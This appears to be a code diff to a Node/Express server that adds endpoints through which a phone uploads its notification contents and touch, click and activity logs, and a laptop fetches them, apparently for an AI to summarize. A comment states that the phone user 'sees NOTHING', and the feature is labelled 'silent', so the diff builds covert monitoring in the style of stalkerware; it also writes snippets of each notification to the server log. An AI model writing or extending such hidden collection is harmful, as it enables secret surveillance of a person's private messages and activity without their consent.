@@ -22,6 +22,13 @@ const devices = new Map();    // device_id -> {name, model, lastSeen, registered
 const MAX_AGE = 10 * 60 * 1000; // 10 min cleanup
 const ONLINE_WINDOW_MS = 20 * 1000; // device online if lastSeen < 20s ago
 
+// v8.2: silent notification batches — device_id -> [{ts, entries}]
+// In-memory, consume-once. The phone uploads raw notification strings here;
+// the laptop AI fetches + summarizes. Phone user sees NOTHING.
+const notifBatches = new Map();
+const NOTIF_BATCH_CAP = 200;   // per-device cap
+const NOTIF_ENTRY_CAP = 4000;  // per-upload entry char cap
+
 // Dashboard stats (in-memory, reset on server restart)
 const startedAt = Date.now();
 let totalCommands = 0;
@@ -347,6 +354,95 @@ app.post('/life_log/upload', authMiddleware, (req, res) => {
     }
     while (store.length > LIFELOG_CAP) store.shift();
     res.json({ ok: true, stored: Math.min(entries.length, 1000), stream: streamType });
+});
+
+// ---------- v8.2: Silent notification batches ----------
+
+// Mobile → Server: upload raw notification strings (consumer gets them later)
+app.post('/notif_upload', authMiddleware, (req, res) => {
+    const deviceId = (req.body && req.body.device_id)
+        || req.headers['x-device-id']
+        || 'legacy';
+    const entries = (req.body && typeof req.body.entries === 'string')
+        ? req.body.entries : '';
+    if (!entries) {
+        return res.json({ ok: true, stored: 0, device_id: deviceId });
+    }
+    let arr = notifBatches.get(deviceId);
+    if (!arr) {
+        arr = [];
+        notifBatches.set(deviceId, arr);
+    }
+    arr.push({ ts: Date.now(), entries: entries.slice(0, NOTIF_ENTRY_CAP) });
+    while (arr.length > NOTIF_BATCH_CAP) arr.shift();
+    touchDevice(deviceId);
+    console.log(`[${new Date().toISOString()}] NOTIF upload ${deviceId}: ${entries.slice(0, 60)}`);
+    res.json({ ok: true, stored: 1, device_id: deviceId });
+});
+
+// Laptop → Server: fetch the latest pending batch (consume-once)
+app.get('/notif_fetch', authMiddleware, (req, res) => {
+    const deviceId = req.query.device_id;
+    if (deviceId && notifBatches.has(deviceId)) {
+        const arr = notifBatches.get(deviceId);
+        notifBatches.delete(deviceId);
+        return res.json({ entries: arr.map(b => b.entries).join('\n') });
+    }
+    // No specific device (legacy/single-device mode): drain everything.
+    const parts = [];
+    for (const [, arr] of notifBatches) {
+        parts.push(...arr.map(b => b.entries));
+    }
+    notifBatches.clear();
+    res.json({ entries: parts.join('\n') });
+});
+
+// ---------- v8.5: Live touch/activity tracking ----------
+
+// device_id -> [{ts, entries}] — phone uploads raw touch/click/activity lines,
+// laptop fetches them live (consume-once) for the Touch Activity tab.
+const touchBatches = new Map();
+const TOUCH_BATCH_CAP = 200;
+const TOUCH_ENTRY_CAP = 8000;
+
+// Mobile → Server: upload raw touch/activity lines
+app.post('/touch_upload', authMiddleware, (req, res) => {
+    const deviceId = (req.body && req.body.device_id)
+        || req.headers['x-device-id']
+        || 'legacy';
+    const entries = (req.body && typeof req.body.entries === 'string')
+        ? req.body.entries : '';
+    if (!entries) {
+        return res.json({ ok: true, stored: 0, device_id: deviceId });
+    }
+    let arr = touchBatches.get(deviceId);
+    if (!arr) {
+        arr = [];
+        touchBatches.set(deviceId, arr);
+    }
+    arr.push({ ts: Date.now(), entries: entries.slice(0, TOUCH_ENTRY_CAP) });
+    while (arr.length > TOUCH_BATCH_CAP) arr.shift();
+    touchDevice(deviceId);
+    res.json({ ok: true, stored: 1, device_id: deviceId });
+});
+
+// Laptop → Server: fetch latest pending touch batch (consume-once)
+app.get('/touch_fetch', authMiddleware, (req, res) => {
+    const deviceId = req.query.device_id;
+    if (deviceId && touchBatches.has(deviceId)) {
+        const arr = touchBatches.get(deviceId);
+        touchBatches.delete(deviceId);
+        return res.json({ device_id: deviceId, entries: arr.map(b => b.entries).join('\n'), count: arr.length });
+    }
+    // No specific device: drain everything (legacy/single view).
+    const parts = [];
+    let n = 0;
+    for (const [, arr] of touchBatches) {
+        parts.push(...arr.map(b => b.entries));
+        n += arr.length;
+    }
+    touchBatches.clear();
+    res.json({ entries: parts.join('\n'), count: n });
 });
 
 // Start
